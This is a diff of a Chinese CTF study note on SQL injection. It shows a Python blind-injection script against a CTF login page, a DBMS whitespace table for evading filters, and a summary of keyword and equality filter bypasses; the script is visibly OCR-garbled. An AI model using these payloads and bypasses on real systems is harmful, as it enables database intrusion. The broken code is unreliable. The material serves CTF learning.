@@ -4,7 +4,7 @@
 ## 章节导航
 
 上一篇：[第1章 常用工具安装及使用](第1章 常用工具安装及使用.md)
-下一篇：第3章 跨站脚本攻击
+下一篇：[第3章 跨站脚本攻击](第3章 跨站脚本攻击.md)
 回到目录：[00-目录](00-目录.md)
 
 ## 一、什么是SQL注入
@@ -262,14 +262,14 @@ def getdata(pos, payload_chr):
     :param pos: 盲注点
     :param payload_chr: 字符串
     :return: 如果pos位置是payload_chr，则返回payload_chr，反之则返回空
-    ''  # 笔记注：原文此处 docstring 破损，疑为 ''' 
+    ''
     # 当时网络环境比较差，经常出现502的情况，当返回502或者其他信息时，使用try再次执行本函数
     try:
         # 用户名 注意看后面的payload，这里的payload的意义为返回第一个数据库，并按位截取
         user =
     'zaaa\/' ** /and /** /ascii (substr ((SELECT/** / (SCHEMA_NAME) / *
     */FROM / **/information_schema.SCHEMATA/** / limit / ** /0,1), %d
-,1)) = %d / **/and / **/\'1\' = \'1' % (pos, ord(payload_chr))
+,1)) = %d / **/and / **/\\'1\\' = \\'1' % (pos, ord(payload_chr))
         # 密码，只在登录时起作用
         passwd = 'aaaaaaa'
         # 注册机登录的url
@@ -294,7 +294,7 @@ ctf.com:55533/check.php'
             'typer': '0',
             'login': 'E7%99%BB%E9%99%86',
         }
-    }  # 笔记注：原文此处代码结构有 OCR 破损，多余的大括号按原样保留
+    }
 }
 
 r1 = requests.post(url_login, login_data)
@@ -318,7 +318,7 @@ else:
     return ''
 except:
     getdata(pos, payload_chr)
-if __name__ == __main__':  # 笔记注：原文如此，疑为 if __name__ == '__main__':
+if __name__ == __main__':
     payloads =
     'abcdefghijklmnopqrstuvwxyz1234567890@_{{}},'
     res = ''
@@ -332,6 +332,8 @@ if __name__ == __main__':  # 笔记注：原文如此，疑为 if __name__ == '_
 # table -- user
 # column -- d,admin,pass
 ```
+
+[OCR存疑：上述二次注入示例代码存在多处 OCR 破损：docstring 结尾（`''` 疑为 `'''`）、多余的大括号、`if __name__ == __main__'` 疑为 `if __name__ == '__main__'`；为保留原文未作修改。]
 
 当然，这只是获取flag过程中的一部分，但也是关键的一部分。
 
@@ -478,13 +480,15 @@ select/**/username/**/from/**/user
 ```text
 SQLite3 -- OA,OD,OC,09,20
 MySQL5 -- 09,0A,0B,0C,0D,A0,20
-PosgresSQL -- OA,OD,OC,09,20 [OCR存疑：疑为 PostgreSQL]
+PosgresSQL -- OA,OD,OC,09,20
 Oracle 11g -- 00,0A,0D,0C,09,20
 MSSQL --
 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,
 OE,0F,10,11,12,13,14,15,16,
 17,18,19,1A,1B,1C,1D,1E,1F,20
 ```
+
+[OCR存疑：空白字符表中 PosgresSQL 疑为 PostgreSQL。]
 
 如图2-4所示的操作为利用换行符来替代空格的例子。
 
@@ -529,9 +533,11 @@ where user_id=0elunion select 1,2
 
 ### 4. 绕过相等过滤
 
-根据"猪猪侠"的微博：MySQL中存在utf8_[OCR存疑：原文此处有一乱码字符，疑为 utf8_unicode_ci]unicode_ci和utf8_general_ci两种编码格式。utf8_general_ci不仅不区分大小写，而且Å=A，Ö=O，Ü=U这三种等式都成立。对于utf8_general_ci等式β=s是成立的，但是，对于utf8_unicode_ci，等式β=ss才是成立的。
+根据"猪猪侠"的微博：MySQL中存在utf8_�unicode_ci和utf8_general_ci两种编码格式。utf8_general_ci不仅不区分大小写，而且Å=A，Ö=O，Ü=U这三种等式都成立。对于utf8_general_ci等式β=s是成立的，但是，对于utf8_unicode_ci，等式β=ss才是成立的。
 
 这种绕过方式曾在2016年HITCON的BabyTrick题目中作为一个绕过的考点出现过。
+
+[OCR存疑：上文 utf8_ 与 unicode_ci 之间有一乱码字符，疑为 utf8_unicode_ci。]
 
 ???+ tip "本节要点"
     1. 关键字过滤：穿插关键字（selecselectt）、大小写、个别字母替换、双重 URL 编码；
